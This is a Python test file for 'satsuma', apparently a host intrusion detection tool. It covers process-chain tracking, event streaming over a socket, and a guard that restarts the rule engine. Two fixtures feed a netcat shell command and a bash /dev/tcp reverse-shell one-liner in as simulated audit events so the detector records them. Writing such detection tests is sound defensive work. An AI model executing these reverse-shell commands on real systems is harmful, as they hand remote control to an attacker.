"""Event flow and flow guard (2.2.32).

Olay akışı ve akış bekçisi.
"""
import json
import os
import socket
import time
from pathlib import Path
from types import SimpleNamespace as NS

from satsuma import flow as F
from satsuma.flow_guard import FlowGuard
from satsuma.pipeline import Pipeline
from satsuma.smart_rules import SmartRuleEngine
from satsuma.store import Store
import run_satsuma_teams as T

ROOT = Path(__file__).parents[1]


def host(pid, cmd, exe, starttime=1, ppid=1, **extra):
    return {'source': 'audit', 'action': 'execve', 'pid': pid, 'ppid': ppid, 'uid': 0,
            'exe': exe, 'cmd': cmd, 'starttime': starttime, **extra}


def test_process_flow_keeps_chain_and_forgets_after_window():
    now = [1000.0]
    flow = F.ProcessFlow(window=60, clock=lambda: now[0])
    flow.add({'raw_id': 'a', 'event': {}, 'raw': host(10, 'bash', '/usr/bin/bash', ppid=1)})
    flow.add({'raw_id': 'b', 'event': {}, 'raw': host(11, 'nc -e /bin/sh x 1', '/usr/bin/nc', ppid=10)})
    chain = flow.snapshot(11, 1)['chain']
    assert [c['pid'] for c in chain] == ['11', '10']
    assert chain[0]['events'][0]['cmd'].startswith('nc -e')
    now[0] += 120
    flow.prune()
    assert flow.snapshot(11, 1)['chain'] == []
    assert flow.window_rows(0) == []


def test_reused_pid_is_a_different_process():
    flow = F.ProcessFlow()
    flow.add({'raw_id': 'a', 'event': {}, 'raw': host(5, 'one', '/usr/bin/a', starttime=1)})
    flow.add({'raw_id': 'b', 'event': {}, 'raw': host(5, 'two', '/usr/bin/b', starttime=2)})
    assert flow.snapshot(5, 1)['chain'][0]['cmd'] == 'one'
    assert flow.snapshot(5, 2)['chain'][0]['cmd'] == 'two'


def test_sender_and_receiver_round_trip(tmp_path):
    path = tmp_path / 'flow.sock'
    receiver = F.FlowReceiver(path=path).start()
    try:
        assert F.FlowSender(path).send({'raw_id': 'x', 'event': {'a': 1}})
        deadline = time.time() + 3
        got = []
        while not got and time.time() < deadline:
            got = receiver.drain()
            time.sleep(0.02)
        assert got == [{'raw_id': 'x', 'event': {'a': 1}}]
    finally:
        receiver.close()


def test_sender_without_engine_counts_a_failure(tmp_path):
    sender = F.FlowSender(tmp_path / 'missing.sock')
    # 2.2.52: the event waits for the engine instead of being lost.
    assert sender.send({'a': 1}) is True and sender.failed == 0 and len(sender.backlog) == 1


def test_host_events_stream_and_never_reach_the_database(tmp_path):
    store = Store(tmp_path, test=True)
    pipeline = Pipeline(store, {'response_enabled': False})
    got = []
    pipeline.flow_sink = got.append
    event_id = pipeline.ingest_host(host(42, 'ls', '/usr/bin/ls'))
    assert event_id.startswith('flow-') and got[0]['raw_id'] == event_id
    assert store.db.execute("select count(*) from records where kind in ('events','normalized')").fetchone()[0] == 0


def test_database_path_stays_when_flow_is_off(tmp_path):
    store = Store(tmp_path, test=True)
    pipeline = Pipeline(store, {'response_enabled': False, 'flow_stream_enabled': False})
    pipeline.ingest_host(host(42, 'ls', '/usr/bin/ls'))
    assert store.db.execute("select count(*) from records where kind='normalized'").fetchone()[0] == 1


def test_flow_tick_records_suspicious_finding_with_its_chain(tmp_path, monkeypatch):
    store = Store(tmp_path, test=True)
    flow = F.ProcessFlow()
    receiver = F.FlowReceiver(path=tmp_path / 's')
    pipeline = Pipeline(store, {'response_enabled': False})
    pipeline.flow_sink = receiver.put
    pipeline._self = NS(is_own=lambda raw: False, health=lambda: {})
    for name in ('_dispatch_safe_actions', '_automatic_actions', '_sudo_autoblock', '_confirmed_actions'):
        monkeypatch.setattr(T, name, lambda *a, **k: None)
    pipeline.ingest_host(host(70, 'ls -la', '/usr/bin/ls'))
    pipeline.ingest_host(host(71, 'bash -i >& /dev/tcp/203.0.113.9/4444 0>&1', '/usr/bin/bash', ppid=70))
    T._flow_tick(store, {'investigation_enabled': False}, pipeline, SmartRuleEngine(), flow, receiver)
    rows = [json.loads(b)['metadata']['finding'] for (b,) in store.db.execute(
        "select body from records where kind='events' and json_extract(body,'$.event.category')='finding'")]
    assert rows, 'reverse shell must be recorded'
    assert all(T._recordable(r) for r in rows)
    assert rows[0]['flow']['chain'][0]['pid'] == '71'
    # ls alone left nothing behind
    assert store.db.execute("select count(*) from records where kind in ('normalized')").fetchone()[0] == 0


def test_recordable_keeps_only_suspicious_or_kill_eligible():
    assert not T._recordable({'classification': 'indicator', 'severity': 'low'})
    assert T._recordable({'classification': 'suspicious', 'severity': 'low'})


class Runner:
    def __init__(self):
        self.calls = []

    def __call__(self, args, **kwargs):
        self.calls.append(args)
        return NS(returncode=0, stdout='', stderr='')


def test_flow_guard_restarts_a_silent_engine_once_per_gap(tmp_path):
    store = Store(tmp_path, test=True)
    now = [10000.0]
    runner = Runner()
    guard = FlowGuard(store, runner=runner, clock=lambda: now[0], socket_path=tmp_path / 'none.sock')
    store.set('flow.health', {'updated_at': now[0] - 100, 'receiver': {'received': 5, 'dropped': 0}})
    assert 'engine_silent' in guard.check()['problems']
    now[0] += 10
    guard.check()
    assert runner.calls == [['/usr/bin/systemctl', 'restart', 'satsuma-teams.service']]
    kinds = [json.loads(b)['code'] for (b,) in store.db.execute("select body from records where kind='flow_guard'")]
    assert 'engine_silent' in kinds and 'engine_restarted' in kinds


def test_flow_guard_reports_lost_events_and_is_quiet_when_healthy(tmp_path):
    store = Store(tmp_path, test=True)
    sock = tmp_path / 'flow.sock'
    sock.write_text('')
    now = [5000.0]
    guard = FlowGuard(store, runner=Runner(), clock=lambda: now[0], socket_path=sock)
    store.set('flow.health', {'updated_at': now[0], 'receiver': {'received': 1, 'dropped': 0}})
    assert guard.check()['status'] == 'RUNNING'
    store.set('flow.health', {'updated_at': now[0], 'receiver': {'received': 9, 'dropped': 4}})
    assert 'receiver_dropped' in guard.check()['problems']
    assert store.db.execute("select count(*) from records where kind='flow_guard'").fetchone()[0] == 1


def test_flow_guard_is_a_catalogued_record_kind():
    from satsuma import record_catalog
    assert 'flow_guard' in record_catalog.KINDS
    text = record_catalog.render('flow_guard', {'code': 'engine_restarted', 'ok': False, 'timestamp': 1})
    assert text['text'] == 'Kural motoru yeniden başlatıldı' and text['tone'] == 'crit'


def test_flow_guard_unit_and_package():
    unit = (ROOT / 'systemd' / 'satsuma-flow-guard.service').read_text()
    assert 'satsuma.flow_guard' in unit and 'StartLimitBurst=3' in unit
    spec = (ROOT / 'packaging' / 'satsuma-core.spec').read_text()
    assert 'systemctl enable --now satsuma-flow-guard.service' in spec
    assert 'RuntimeDirectory=satsuma-flow' in (ROOT / 'systemd' / 'satsuma-teams.service').read_text()

